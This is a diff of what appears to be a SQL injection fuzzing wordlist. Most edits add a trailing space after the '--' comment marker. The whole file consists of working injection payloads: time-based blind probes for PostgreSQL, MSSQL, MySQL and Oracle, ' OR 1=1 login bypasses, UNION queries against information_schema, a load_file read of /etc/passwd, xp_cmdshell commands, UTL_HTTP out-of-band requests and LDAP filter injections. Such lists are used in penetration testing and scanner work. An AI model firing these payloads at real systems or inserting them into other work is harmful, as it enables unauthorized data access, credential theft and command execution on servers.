@@ -12,7 +12,7 @@
 %00
 "><
 🅐
-admin'))%20OR%20335=(SELECT%20335%20FROM%20PG_SLEEP(15))--
+admin'))%20OR%20335=(SELECT%20335%20FROM%20PG_SLEEP(15))-- 
 -6513%27%20OR%20%28SELECT%20INSTR2%28NULL%2CNULL%29%20FROM%20DUAL%29%20IS%20NULL--%20SpSw
 admin%20waitfor%20delay%20'0:0:15'%20--%20
 admin%20OR%202%2B949-949-1=0%2B0%2B0%2B1%20--%20
@@ -24,8 +24,8 @@ admin@admin.com'%7C%7CDBMS_PIPE.RECEIVE_MESSAGE(CHR(98)%7C%7CCHR(98)%7C%7CCHR(98
 admin(select(0)from(select(sleep(15)))v)/*'%2B(select(0)from(select(sleep(15)))v)%2B'"%2B(select(0)from(select(sleep(15)))v)%2B"*/
 if(now()=sysdate()%2Csleep(15)%2C0)
 admin';%20waitfor%20delay%20'0:0:15'%20--%20
-admin'%20OR%20227=(SELECT%20227%20FROM%20PG_SLEEP(15))--
-admin')%20OR%20565=(SELECT%20565%20FROM%20PG_SLEEP(15))--
+admin'%20OR%20227=(SELECT%20227%20FROM%20PG_SLEEP(15))-- 
+admin')%20OR%20565=(SELECT%20565%20FROM%20PG_SLEEP(15))-- 
 1%00%C0%A7%C0%A2%252527%252522
 admin'%7C%7CDBMS_PIPE.RECEIVE_MESSAGE(CHR(98)%7C%7CCHR(98)%7C%7CCHR(98)%2C15)%7C%7C'
 (select(0)from(select(sleep(15)))v)/*'%2B(select(0)from(select(sleep(15)))v)%2B'"%2B(select(0)from(select(sleep(15)))v)%2B"*/
@@ -47,13 +47,13 @@ admin@admin.com'%7C%7CDBMS_PIPE.RECEIVE_MESSAGE(CHR(98)%7C%7CCHR(98)%7C%7CCHR(98
 admin%20OR%202%2B949-949-1=0%2B0%2B0%2B1%20--%20
 admin');%20waitfor%20delay%20'0:0:9'
 'xor(if(mid(database(),1,1)=0x41,sleep(30),0))or
-admin')%20OR%20565=(SELECT%20565%20FROM%20PG_SLEEP(15))--
-admin'%20OR%20227=(SELECT%20227%20FROM%20PG_SLEEP(15))--
+admin')%20OR%20565=(SELECT%20565%20FROM%20PG_SLEEP(15))-- 
+admin'%20OR%20227=(SELECT%20227%20FROM%20PG_SLEEP(15))-- 
 admin';%20waitfor%20delay%20'0:0:15'%20--%20
 1%20AND%20(SELECT%208603%20FROM%20(SELECT(SLEEP(10)))xMdQ)
-xx49236287'%20or%208896=8896--
+xx49236287'%20or%208896=8896-- 
 1)%20OR%20ELT(2023=2023,SLEEP(5))#
-admin'%20OR%201=1--
+admin'%20OR%201=1-- 
 (SELECT%20(CASE%20WHEN%20(9967=9967)%20THEN%2010%20ELSE%20(SELECT%204619%20UNION%20SELECT%207284)%20END))
 10%20AND%20(SELECT%201030%20FROM(SELECT%20COUNT(*),CONCAT(0x7176717071,(SELECT%20(ELT(1030=1030,1))),0x7176717871,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)
 10%20AND%20(SELECT%204814%20FROM%20(SELECT(SLEEP(5)))jQqq)
@@ -61,7 +61,7 @@ admin'%20OR%201=1--
 +or+sleep(0.2)%23)
 -1;%20waitfor%20delay%20'0:0:10'%20--%20
 if(now()=sysdate()%2Csleep(15)%2C0)
-Be7BtCuD'))%20OR%20335=(SELECT%20335%20FROM%20PG_SLEEP(15))--
+Be7BtCuD'))%20OR%20335=(SELECT%20335%20FROM%20PG_SLEEP(15))-- 
 20PVEY5L
 admin'"
 1;SELECT IF((8303>8302),SLEEP(13),2356)#
@@ -90,22 +90,22 @@ admin') OR 11=(SELECT 11 FROM PG_SLEEP(6))--
 ; execute immediate 'sel' || 'ect us' || 'er'
 benchmark(10000000,MD5(1))#
 1' OR NOT 2470=2470-- Ontu
-' WAITFOR DELAY '0:0:5'--
+' WAITFOR DELAY '0:0:5'-- 
 ';WAITFOR DELAY '0:0:5'-- 
 ')) or sleep(5)='
-;waitfor delay '0:0:5'--
-);waitfor delay '0:0:5'--
-';waitfor delay '0:0:5'--
-";waitfor delay '0:0:5'--
-');waitfor delay '0:0:5'--
-");waitfor delay '0:0:5'--
-));waitfor delay '0:0:5'--
-";waitfor delay '0:0:__TIME__'--
-1) or pg_sleep(__TIME__)--
+;waitfor delay '0:0:5'-- 
+);waitfor delay '0:0:5'-- 
+';waitfor delay '0:0:5'-- 
+";waitfor delay '0:0:5'-- 
+');waitfor delay '0:0:5'-- 
+");waitfor delay '0:0:5'-- 
+));waitfor delay '0:0:5'-- 
+";waitfor delay '0:0:__TIME__'-- 
+1) or pg_sleep(__TIME__)-- 
 ||(elt(-3+5,bin(15),ord(10),hex(char(45))))
 "hi"") or (""a""=""a"
 " or sleep(__TIME__)#
-pg_sleep(__TIME__)--
+pg_sleep(__TIME__)-- 
 *(|(objectclass=*))
 declare @q nvarchar (200) 0x730065006c00650063 ...
  or 0=0 #
@@ -114,17 +114,17 @@ insert
 ) or ('a'='a
 ; exec xp_regread
 *|
-@var select @var as var into temp end --
+@var select @var as var into temp end -- 
 1)) or benchmark(10000000,MD5(1))#
 asc
 (||6)
 "a"" or 3=3--"
 " or benchmark(10000000,MD5(1))#
 # from wapiti
- or 0=0 --
-1 waitfor delay '0:0:10'--
+ or 0=0 -- 
+1 waitfor delay '0:0:10'-- 
  or 'a'='a
-hi or 1=1 --"
+hi or 1=1 -- "
 or a = a
  UNION ALL SELECT
 ) or sleep(__TIME__)='
@@ -139,23 +139,23 @@ limit
 PRINT
 hi') or ('a'='a
  or 3=3
-));waitfor delay '0:0:__TIME__'--
-a' waitfor delay '0:0:10'--
+));waitfor delay '0:0:__TIME__'-- 
+a' waitfor delay '0:0:10'-- 
 1;(load_file(char(47,101,116,99,47,112,97,115, ...
 or%201=1
 1 or sleep(__TIME__)#
 or 1=1
- and 1 in (select var from temp)--
+ and 1 in (select var from temp)-- 
  or '7659'='7659
  or 'text' = n'text'
- --
+ -- 
  or 1=1 or ''='
 declare @s varchar (200) select @s = 0x73656c6 ...
 exec xp
-; exec master..xp_cmdshell 'ping 172.10.1.255'--
+; exec master..xp_cmdshell 'ping 172.10.1.255'-- 
 3.10E+17
-" or pg_sleep(__TIME__)--
-x' AND email IS NULL; --
+" or pg_sleep(__TIME__)-- 
+x' AND email IS NULL; -- 
 &
 admin' or '
  or 'unusual' = 'unusual'
@@ -166,9 +166,9 @@ truncate
 declare @s varchar(200) select @s = 0x77616974 ...
 tz_offset
 sqlvuln
-"));waitfor delay '0:0:__TIME__'--
+"));waitfor delay '0:0:__TIME__'-- 
 ||6
-or%201=1 --
+or%201=1 -- 
 %2A%28%7C%28objectclass%3D%2A%29%29
 or a=a
 ) union select * from information_schema.tables;
@@ -177,15 +177,15 @@ or isNULL(1/0) /*
 26 %
 " or "a"="a
 (sqlvuln)
-x' AND members.email IS NULL; --
- or 1=1--
+x' AND members.email IS NULL; -- 
+ or 1=1-- 
  and 1=( if((load_file(char(110,46,101,120,11 ...
 0x770061006900740066006F0072002000640065006C00 ...
 %20'sleep%2050'
 as
-1)) or pg_sleep(__TIME__)--
+1)) or pg_sleep(__TIME__)-- 
 /**/or/**/1/**/=/**/1
- union all select @@version--
+ union all select @@version-- 
 ,@variable
 (sqlattempt2)
  or (EXISTS)
@@ -194,7 +194,7 @@ t'exec master..xp_cmdshell 'nslookup www.googl ...
 1 or benchmark(10000000,MD5(1))#
 %20or%20''='
 ||UTL_HTTP.REQUEST
- or pg_sleep(__TIME__)--
+ or pg_sleep(__TIME__)-- 
 hi' or 'x'='x';
 ") or sleep(__TIME__)="
  or 'whatever' in ('whatever')
@@ -202,11 +202,11 @@ hi' or 'x'='x';
  union select 1,load_file('/etc/passwd'),1,1,1;
 0x77616974666F722064656C61792027303A303A313027 ...
 exec(@s)
-) or pg_sleep(__TIME__)--
+) or pg_sleep(__TIME__)-- 
  union select
  or sleep(__TIME__)#
- select * from information_schema.tables--
-a' or 1=1--
+ select * from information_schema.tables-- 
+a' or 1=1-- 
 a' or 'a' = 'a
 declare @s varchar(22) select @s =
  or 2 between 1 and 3
